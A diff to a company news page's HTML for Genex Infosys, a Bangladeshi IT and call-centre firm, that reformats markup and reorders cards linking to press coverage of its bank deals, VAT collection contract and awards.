@@ -13,171 +13,16 @@
 </div>
 
 <style type="text/css">
-	.post-image{
-		-webkit-box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64); 
-box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
+	.post-image {
+		-webkit-box-shadow: 3px 4px 5px 0px rgba(85, 85, 85, 0.64);
+		box-shadow: 3px 4px 5px 0px rgba(85, 85, 85, 0.64);
 	}
 </style>
 <!-- new row -->
 <div class="col-padding-top-50 row">
 	<div class="content">
 		<div class="col-md-12 news">
-			
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://www.tbsnews.net/sites/default/files/styles/big_3/public/images/2022/09/14/whatsapp_image_2022-09-14_at_1.27.12_pm.jpeg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p>8 March, 2023</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys partners with Standard Chartered to expand the bank’s client base</h3>
-					<p>
-					Genex Infosys Limited — a publicly listed information technology (IT) firm — has partnered with Standard Chartered Bangladesh to help the bank build a wider client base and scale up its distribution network.
-					</p>
-				</div>
-				<div class="post-read-more">
-                    <a href="https://www.tbsnews.net/economy/stocks/genex-infosys-partners-standard-chartered-expand-banks-client-base-495702">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
-			</div>	
-			
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://new-media.dhakatribune.com/en/uploads/2022/09/15/genex-infosys-city-bank.jpeg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p>15 September, 2022</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys inks a deal with City Bank</h3>
-					<p>
-						Under this agreement, part of the City Bank’s customer service operation will be outsourced to Genex, a smart innovator in customer experience management
-					</p>
-				</div>
-				<div class="post-read-more">
-                    <a href="https://www.dhakatribune.com/business/2022/09/15/genex-infosys-inks-a-deal-with-city-bank">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
 
-			</div>	
-
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://tfe-bd.sgp1.cdn.digitaloceanspaces.com/uploads/1663159260.jpg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p> 31 Auguest, 2022</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys appointed for VAT collection for three years</h3>
-					<p>
-						Genex Infosys Limited, a leading IT service provider, will provide and install 300,000 VAT collecting machines in Dhaka city and its adjoining areas as well as in Chottagram city in the next three years.
-					</p>
-				</div>
-				<div class="post-read-more">
-					<a href="https://thefinancialexpress.com.bd/economy/bangladesh/genex-infosys-appointed-for-vat-collection-for-three-years-1663159260">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
-
-			</div>	
-
-		</div>
-	</div>
-</div>
-<!-- end row -->
-<!-- new row -->
-<div class="col-padding-top-50 row">
-	<div class="content">
-		<div class="col-md-12 news">
-			
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://www.tbsnews.net/sites/default/files/styles/big_3/public/images/2022/09/14/whatsapp_image_2022-09-14_at_1.27.12_pm.jpeg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p>8 March, 2023</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys partners with Standard Chartered to expand the bank’s client base</h3>
-					<p>
-					Genex Infosys Limited — a publicly listed information technology (IT) firm — has partnered with Standard Chartered Bangladesh to help the bank build a wider client base and scale up its distribution network.
-					</p>
-				</div>
-				<div class="post-read-more">
-                    <a href="https://www.tbsnews.net/economy/stocks/genex-infosys-partners-standard-chartered-expand-banks-client-base-495702">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
-			</div>	
-			
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://new-media.dhakatribune.com/en/uploads/2022/09/15/genex-infosys-city-bank.jpeg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p>15 September, 2022</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys inks a deal with City Bank</h3>
-					<p>
-						Under this agreement, part of the City Bank’s customer service operation will be outsourced to Genex, a smart innovator in customer experience management
-					</p>
-				</div>
-				<div class="post-read-more">
-                    <a href="https://www.dhakatribune.com/business/2022/09/15/genex-infosys-inks-a-deal-with-city-bank">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
-
-			</div>	
-
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://tfe-bd.sgp1.cdn.digitaloceanspaces.com/uploads/1663159260.jpg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p> 31 Auguest, 2022</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys appointed for VAT collection for three years</h3>
-					<p>
-						Genex Infosys Limited, a leading IT service provider, will provide and install 300,000 VAT collecting machines in Dhaka city and its adjoining areas as well as in Chottagram city in the next three years.
-					</p>
-				</div>
-				<div class="post-read-more">
-					<a href="https://thefinancialexpress.com.bd/economy/bangladesh/genex-infosys-appointed-for-vat-collection-for-three-years-1663159260">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
-
-			</div>	
-
-		</div>
-	</div>
-</div>
-<!-- end row -->
-<!-- new row -->
-<div class="col-padding-top-50 row">
-	<div class="content">
-		<div class="col-md-12 news">
-			
-			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
-				<div class="post-image">
-					<img src="https://tfe-bd.sgp1.cdn.digitaloceanspaces.com/uploads/1670382334.jpg" class="img-responsive" alt="">
-				</div>
-				<div class="post-date">
-					<p>November, 2022</p>
-					<hr>
-				</div>
-				<div class="post-details">
-					<h3>Genex Infosys to triple its revenue in 5 years, bolstered by recent deals</h3>
-					<p>
-					Genex Infosys forecasts its IT business to triple in the next five years on the back of three deals signed in recent times.
-					</p>
-				</div>
-				<div class="post-read-more">
-                    <a href="https://thefinancialexpress.com.bd/stock/bangladesh/genex-infosys-to-triple-its-revenue-in-5-years-bolstered-by-recent-deals-1670382334">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
-				</div>
-			</div>	
-			
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://tds-images.thedailystar.net/sites/default/files/styles/very_big_201/public/images/2022/12/27/cctv_cameras_in_public_buses.png?itok=T8Fzst6a&timestamp=1672140925" class="img-responsive" alt="">
@@ -193,10 +38,48 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					</p>
 				</div>
 				<div class="post-read-more">
-                    <a href="https://www.thedailystar.net/opinion/editorial/news/cctv-buses-drop-the-ocean-3206406">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://www.thedailystar.net/opinion/editorial/news/cctv-buses-drop-the-ocean-3206406">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://www.tbsnews.net/sites/default/files/styles/very_big_1/public/images/2019/10/06/1549514046.jpg?itok=gandFGvb" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<p>7 December, 2022</p>
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>Genex Infosys to triple its revenue in 5 years, bolstered by recent deals</h3>
+					<p>
+						Genex Infosys forecasts its IT business to triple in the next five years on the back of three deals signed in recent times.
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://thefinancialexpress.com.bd/stock/bangladesh/genex-infosys-to-triple-its-revenue-in-5-years-bolstered-by-recent-deals-1670382334">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://www.tbsnews.net/sites/default/files/styles/infograph/public/images/2022/11/06/info-genex-infosis.jpg" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<p>6 November, 2022</p>
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>NBR deal to give Genex Infosys 200% revenue boost</h3>
+					<p>
+						Genex Infosys Limited — a publicly listed information technology (IT) firm — has partnered with Standard Chartered Bangladesh to help the bank build a wider client base and scale up its distribution network.
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://www.tbsnews.net/economy/stocks/nbr-deal-give-genex-infosys-200-revenue-boost-527166">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+			</div>
 
 		</div>
 	</div>
@@ -206,26 +89,114 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 <div class="col-padding-top-50 row">
 	<div class="content">
 		<div class="col-md-12 news">
-			
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
-					<img src="https://www.tbsnews.net/sites/default/files/styles/infograph/public/images/2022/11/06/info-genex-infosis.jpg" class="img-responsive" alt="">
+					<img src="https://www.tbsnews.net/sites/default/files/styles/very_big_1/public/images/2019/10/06/1549514046.jpg?itok=gandFGvb" class="img-responsive" alt="">
 				</div>
 				<div class="post-date">
-					<!--<p>8 March, 2023</p>-->
+					<p>4 November, 2022</p>
 					<hr>
 				</div>
 				<div class="post-details">
-					<h3>NBR deal to give Genex Infosys 200% revenue boost</h3>
+					<h3>NBR contracts out collection services to Genex Infosys</h3>
 					<p>
-					Genex Infosys Limited — a publicly listed information technology (IT) firm — has partnered with Standard Chartered Bangladesh to help the bank build a wider client base and scale up its distribution network.
+						The National Board of Revenue (NBR) has contracted out the Value Added Tax (VAT) collection services to Genex Infosys Ltd., with a target to mobilise an additional Tk 200 billion annually from the retail businesses.
 					</p>
 				</div>
 				<div class="post-read-more">
-                    <a href="https://www.tbsnews.net/economy/stocks/nbr-deal-give-genex-infosys-200-revenue-boost-527166">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://thefinancialexpress.com.bd/trade/nbr-contracts-out-collection-services-to-genex-infosys-1667532807">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
-			</div>	
-			
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://tfe-bd.sgp1.cdn.digitaloceanspaces.com/uploads/1663159260.jpg" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<p> 15 September, 2022</p>
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>Genex Infosys appointed for VAT collection for three years</h3>
+					<p>
+						Genex Infosys Limited, a leading IT service provider, will provide and install 300,000 VAT collecting machines in Dhaka city and its adjoining areas as well as in Chottagram city in the next three years.
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://thefinancialexpress.com.bd/economy/bangladesh/genex-infosys-appointed-for-vat-collection-for-three-years-1663159260">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://new-media.dhakatribune.com/en/uploads/2022/09/15/genex-infosys-city-bank.jpeg" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<p>15 September, 2022</p>
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>Genex Infosys inks a deal with City Bank</h3>
+					<p>
+						Under this agreement, part of the City Bank’s customer service operation will be outsourced to Genex, a smart innovator in customer experience management
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://www.dhakatribune.com/business/2022/09/15/genex-infosys-inks-a-deal-with-city-bank">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+
+			</div>
+
+		</div>
+	</div>
+</div>
+<!-- end row -->
+<!-- new row -->
+<div class="col-padding-top-50 row">
+	<div class="content">
+		<div class="col-md-12 news">
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://new-media.dhakatribune.com/en/uploads/2022/09/14/genex-image.jpeg" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<p>14 September, 2022</p>
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>Standard Chartered teams up with Genex Infosys Limited to expand its reach</h3>
+					<p>
+						Standard Chartered Bangladesh recently partnered with Genex Infosys Limited and took on the organization as its service provider in Bangladesh. Under this agreement Genex will work as a strategic partner, assisting the bank with engaging a wider client base, reads a press release.
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://www.dhakatribune.com/business/2022/09/14/standard-chartered-teams-up-with-genex-infosys-limited-to-expand-its-reach?fbclid=IwAR3JvKngZ7nAm4J5t2ZE_r1XJQx1_VhSrHsKvqekdYam5fdOpNBE8NzM9WQ">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+			</div>
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://www.tbsnews.net/sites/default/files/styles/big_3/public/images/2022/07/06/copy_of_operations_floor_2.jpg" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<p>6 July, 2022</p>
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>How domestic demand made Genex Infosys a BPO industry leader</h3>
+					<p>
+						Genex Infosys Limited, Bangladesh’s largest call centre, provides services to the government, the telecom industry and MNCs. With more than 4,000 employees, the the company is one of the largest in terms of employment creation in the country
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://www.tbsnews.net/features/panorama/how-domestic-demand-made-genex-infosys-bpo-industry-leader-453782">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+
+			</div>
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://www.tbsnews.net/sites/default/files/styles/big_3/public/images/2022/11/10/genex_buet_image_0.jpeg" class="img-responsive" alt="">
@@ -241,17 +212,45 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					</p>
 				</div>
 				<div class="post-read-more">
-                    <a href="https://www.tbsnews.net/economy/corporates/genex-infrastructure-develop-buet-solar-power-system-529494">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://www.tbsnews.net/economy/corporates/genex-infrastructure-develop-buet-solar-power-system-529494">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
+
+		</div>
+	</div>
+</div>
+<!-- end row -->
+<!-- new row -->
+<div class="col-padding-top-50 row">
+	<div class="content">
+		<div class="col-md-12 news">
+
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+				<div class="post-image">
+					<img src="https://www.tbsnews.net/sites/default/files/styles/big_3/public/images/2022/09/14/whatsapp_image_2022-09-14_at_1.27.12_pm.jpeg" class="img-responsive" alt="">
+				</div>
+				<div class="post-date">
+					<!-- <p>14 September, 2022</p> -->
+					<hr>
+				</div>
+				<div class="post-details">
+					<h3>Genex Infosys partners with Standard Chartered to expand the bank’s client base</h3>
+					<p>
+						Genex Infosys Limited — a publicly listed information technology (IT) firm — has partnered with Standard Chartered Bangladesh to help the bank build a wider client base and scale up its distribution network.
+					</p>
+				</div>
+				<div class="post-read-more">
+					<a href="https://www.tbsnews.net/economy/stocks/genex-infosys-partners-standard-chartered-expand-banks-client-base-495702">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+				</div>
+			</div>
 
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://www.newagebd.com/files/records/news/202211/187431_179.jpg" class="img-responsive" alt="">
 				</div>
 				<div class="post-date">
-					<p> 25 November, 2022</p>
+					<!-- <p> 25 November, 2022</p> -->
 					<hr>
 				</div>
 				<div class="post-details">
@@ -264,17 +263,16 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.newagebd.net/article/187431?fbclid=IwAR1IVdVrjO6ZP3PlgFW_e4dkpVedXAAVemJu7_SDWHMjcUzitbOFxggistA">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 
 		</div>
 	</div>
 </div>
-<!-- end row -->
 <!-- new row -->
 <div class="col-padding-top-50 row">
 	<div class="content">
 		<div class="col-md-12 news">
-			
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://images.thedailystar.net/sites/default/files/styles/big_202/public/images/2022/03/23/genx-wb.jpg?itok=vJ51kqx7&timestamp=1648030812" class="img-responsive" alt="">
@@ -286,15 +284,15 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>Genex Infosys wins ‘BASIS Luna Shamsuddoha Award’</h3>
 					<p>
-					Genex Infosys, a business process management (BPM) and IT services company, has been awarded 'BASIS Luna Shamsuddoha Award 2022' for employing the highest number of women in this sector. 
+						Genex Infosys, a business process management (BPM) and IT services company, has been awarded 'BASIS Luna Shamsuddoha Award 2022' for employing the highest number of women in this sector.
 					</p>
 				</div>
 				<div class="post-read-more">
-<a href="https://www.thedailystar.net/business/news/genex-infosys-wins-basis-luna-shamsuddoha-award-2988836">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://www.thedailystar.net/business/news/genex-infosys-wins-basis-luna-shamsuddoha-award-2988836">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
-			
+			</div>
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://www.tbsnews.net/sites/default/files/styles/big_3/public/images/2022/03/01/ucb.png?itok=TI6ztXej&timestamp=1646131300" class="img-responsive" alt="">
@@ -310,10 +308,10 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					</p>
 				</div>
 				<div class="post-read-more">
-<a href="https://www.tbsnews.net/economy/corporates/ucb-implements-robotic-process-automation-378214">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://www.tbsnews.net/economy/corporates/ucb-implements-robotic-process-automation-378214">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -326,23 +324,23 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>‘হেল্পলাইন ১০০’ আধুনিকীকরণে জেনেক্স ও বিটিআরসির চুক্তি</h3>
 					<p>
-						দেশে মোবাইল ফোন ব্যবহারকারীদের অভিযোগ দেওয়ার প্ল্যাটফর্ম ‘হেল্পলাইন ১০০’ আরো আধুনিকীকরণে দেশের শীর্ষস্থানীয় প্রযুক্তি প্রতিষ্ঠান জেনেক্স ইনফোসিসের সঙ্গে চুক্তিবদ্ধ হয়েছে বাংলাদেশ টেলিকমিউনিকেশন রেগুলেটরি কমিশন (বিটিআরসি)। 
+						দেশে মোবাইল ফোন ব্যবহারকারীদের অভিযোগ দেওয়ার প্ল্যাটফর্ম ‘হেল্পলাইন ১০০’ আরো আধুনিকীকরণে দেশের শীর্ষস্থানীয় প্রযুক্তি প্রতিষ্ঠান জেনেক্স ইনফোসিসের সঙ্গে চুক্তিবদ্ধ হয়েছে বাংলাদেশ টেলিকমিউনিকেশন রেগুলেটরি কমিশন (বিটিআরসি)।
 					</p>
 				</div>
 				<div class="post-read-more">
 					<a href="https://www.jugantor.com/tech/513541/%E0%A6%B9%E0%A7%87%E0%A6%B2%E0%A7%8D%E0%A6%AA%E0%A6%B2%E0%A6%BE%E0%A6%87%E0%A6%A8-%E0%A7%A7%E0%A7%A6%E0%A7%A6-%E0%A6%86%E0%A6%A7%E0%A7%81%E0%A6%A8%E0%A6%BF%E0%A6%95%E0%A7%80%E0%A6%95%E0%A6%B0%E0%A6%A3%E0%A7%87-%E0%A6%9C%E0%A7%87%E0%A6%A8%E0%A7%87%E0%A6%95%E0%A7%8D%E0%A6%B8-%E0%A6%93-%E0%A6%AC%E0%A6%BF%E0%A6%9F%E0%A6%BF%E0%A6%86%E0%A6%B0%E0%A6%B8%E0%A6%BF%E0%A6%B0-%E0%A6%9A%E0%A7%81%E0%A6%95%E0%A7%8D%E0%A6%A4%E0%A6%BF">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 		</div>
 	</div>
-</div>	
+</div>
 <!-- end row -->
 <!-- new row -->
 <div class="col-padding-top-50 row">
 	<div class="content">
 		<div class="col-md-12 news">
-			
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://www.theindependentbd.com/assets/news_images/243160439_2997840137200611_630851260096515062_n.jpg" class="img-responsive" alt="">
@@ -354,15 +352,15 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>Genex Infosys wins ‘Best Employer Brand 2021Award’</h3>
 					<p>
-					Genex Infosys, a leading BPM and IT Services company in the country, as well as the first publicly listed company in the country’s Information Technology enabled Services (ITeS) Sector, has won the prestigious Best Employer Brand 2021 Award, under the category of ‘Operational Excellence and Quality in BPO Industry’.
+						Genex Infosys, a leading BPM and IT Services company in the country, as well as the first publicly listed company in the country’s Information Technology enabled Services (ITeS) Sector, has won the prestigious Best Employer Brand 2021 Award, under the category of ‘Operational Excellence and Quality in BPO Industry’.
 					</p>
 				</div>
 				<div class="post-read-more">
-<a href="https://m.theindependentbd.com/post/269042">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://m.theindependentbd.com/post/269042">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
-			
+			</div>
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://d30fl32nd2baj9-cloudfront-net.cdn.ampproject.org/ii/w820/s/d30fl32nd2baj9.cloudfront.net/media/2020/09/01/genex-infosis-010920-01.jpg/ALTERNATES/w300/genex-infosis-010920-01.jpg" class="img-responsive" alt="">
@@ -378,10 +376,10 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					</p>
 				</div>
 				<div class="post-read-more">
-<a href="https://m-bdnews24-com.cdn.ampproject.org/c/s/m.bdnews24.com/amp/bn/detail/stocks/1895079">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
+					<a href="https://m-bdnews24-com.cdn.ampproject.org/c/s/m.bdnews24.com/amp/bn/detail/stocks/1895079">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -401,11 +399,11 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.thedailystar.net/pr/news/icddrb-relies-microsoft-dynamics-365-its-next-generation-erp-software-platform-2095553">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>		
-			
+			</div>
+
 		</div>
 	</div>
-</div>	
+</div>
 <!-- end row -->
 <!-- new row -->
 <div class="col-padding-top-50 row">
@@ -432,7 +430,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://www.thedailystar.net/business/news/genex-infosys-now-distributor-siemens-software-2001813">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>	
+			</div>
 
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -452,8 +450,8 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 					<a href="https://today.thefinancialexpress.com.bd/stock-corporate/genex-infosys-to-provide-rpa-services-to-banglalink-1603211426">Read More <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
 				</div>
 
-			</div>		
-			
+			</div>
+
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://www.daily-sun.com/assets/news_images/2020/09/29/Dailysun-23.jpg" class="img-responsive" alt="">
@@ -465,7 +463,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>Sonali Bank, Genex Infosys ink agreement</h3>
 					<p>
-						Sonali Bank Limited signed an agreement with Genex Infosys Limited in the capital recently. 
+						Sonali Bank Limited signed an agreement with Genex Infosys Limited in the capital recently.
 						<br>
 						Under the deal, students of all government and non-government educational institutions of the country now able to pay their fees online through Sonali Bank Limited, said a press release. Genex Infosys Limited is providing technical assistance to Sonali Bank Limited regarding this.
 					</p>
@@ -478,13 +476,13 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 
 		</div>
 	</div>
-</div>	
+</div>
 <!-- end row -->
 <!-- new row -->
 <div class="col-padding-top-50 row">
 	<div class="content">
 		<div class="col-md-12 news">
-			
+
 
 			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
@@ -497,9 +495,9 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>রেডডট ডিজিটালের সঙ্গে চুক্তি করেছে জেনেক্স ইনফোসিস</h3>
 					<p>
-					দেশের দ্বিতীয় বৃহত্তম মোবাইল অপারেটর রবি আজিয়াটা লিমিটেডের সহযোগী প্রতিষ্ঠান রেডডট ডিজিটাল লিমিটেডের সঙ্গে একটি চুক্তি করতে চলেছে পুঁজিবাজারে তালিকাভুক্ত কোম্পানি জেনেক্স ইনফোসিস লিমিটেড। কোম্পানিটির পরিচালনা পর্ষদ ‘স্ট্র্যাটেজিক বিজনেস এগ্রিমেন্ট’ শীর্ষক এ চুক্তির বিষয়ে অনুমোদন দিয়েছে। ঢাকা স্টক এক্সচেঞ্জ (ডিএসই) সূত্রে এ তথ্য জানা গেছে।
-					<br><br>
-					এই চুক্তি অনুযায়ী, ইন্টারনেট প্রটোকল টেলিভিশন (আইপিটিভি) ও অনলাইন স্ট্রিমিং প্লাটফর্মের সমন্বয়ে ‘বিঞ্জ’ নামে নামে একটি সেবা চালু করা হবে, যার মাধ্যমে গ্রাহকরা ডিজিটাল বিনোদনের কনটেন্ট কিনতে পারবেন। বিঞ্জ হবে দেশের প্রথম গুগল-সার্টিফায়েড অনলাইন ভিডিও স্ট্রিমিং সার্ভিস। যেকোনো অ্যান্ড্রয়েড অপারেটিং সিস্টেম চালিত ডিভাইসে এটি ব্যবহার করা যাবে। বিঞ্জ ডেভেলপ করেছে জেনেক্স ইনফোসিস।
+						দেশের দ্বিতীয় বৃহত্তম মোবাইল অপারেটর রবি আজিয়াটা লিমিটেডের সহযোগী প্রতিষ্ঠান রেডডট ডিজিটাল লিমিটেডের সঙ্গে একটি চুক্তি করতে চলেছে পুঁজিবাজারে তালিকাভুক্ত কোম্পানি জেনেক্স ইনফোসিস লিমিটেড। কোম্পানিটির পরিচালনা পর্ষদ ‘স্ট্র্যাটেজিক বিজনেস এগ্রিমেন্ট’ শীর্ষক এ চুক্তির বিষয়ে অনুমোদন দিয়েছে। ঢাকা স্টক এক্সচেঞ্জ (ডিএসই) সূত্রে এ তথ্য জানা গেছে।
+						<br><br>
+						এই চুক্তি অনুযায়ী, ইন্টারনেট প্রটোকল টেলিভিশন (আইপিটিভি) ও অনলাইন স্ট্রিমিং প্লাটফর্মের সমন্বয়ে ‘বিঞ্জ’ নামে নামে একটি সেবা চালু করা হবে, যার মাধ্যমে গ্রাহকরা ডিজিটাল বিনোদনের কনটেন্ট কিনতে পারবেন। বিঞ্জ হবে দেশের প্রথম গুগল-সার্টিফায়েড অনলাইন ভিডিও স্ট্রিমিং সার্ভিস। যেকোনো অ্যান্ড্রয়েড অপারেটিং সিস্টেম চালিত ডিভাইসে এটি ব্যবহার করা যাবে। বিঞ্জ ডেভেলপ করেছে জেনেক্স ইনফোসিস।
 					</p>
 				</div>
 				<div class="post-read-more">
@@ -508,7 +506,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 
 			</div>
 
-		    <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
+			<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12 post">
 				<div class="post-image">
 					<img src="https://tbsnews.net/sites/default/files/styles/big_3/public/images/2019/10/06/1549514046.jpg?itok=8BTWPBEg&timestamp=1603292875" class="img-responsive" alt="">
 				</div>
@@ -519,7 +517,7 @@ box-shadow: 3px 4px 5px 0px rgba(85,85,85,0.64);
 				<div class="post-details">
 					<h3>Genex Infosys gets licence to stream live TV</h3>
 					<p>
-					The company will develop a Google-certified online video-streaming service along with an android-based application that may offer news and entertainment.Genex Infosys Ltd, a local information and technology service management company, has recently obtained an Internet Protocol Television (IPTV) licence from the telecom regulator.An official of the company said the licence will be used to launch IPTV on an online streaming platform from where customers will have to purchase the service for digital entertainment.
+						The company will develop a Google-certified online video-streaming service along with an android-based application that may offer news and entertainment.Genex Infosys Ltd, a local information and technology service management company, has recently obtained an Internet Protocol Television (IPTV) licence from the telecom regulator.An official of the company said the licence will be used to launch IPTV on an online streaming platform from where customers will have to purchase the service for digital entertainment.
 					</p>
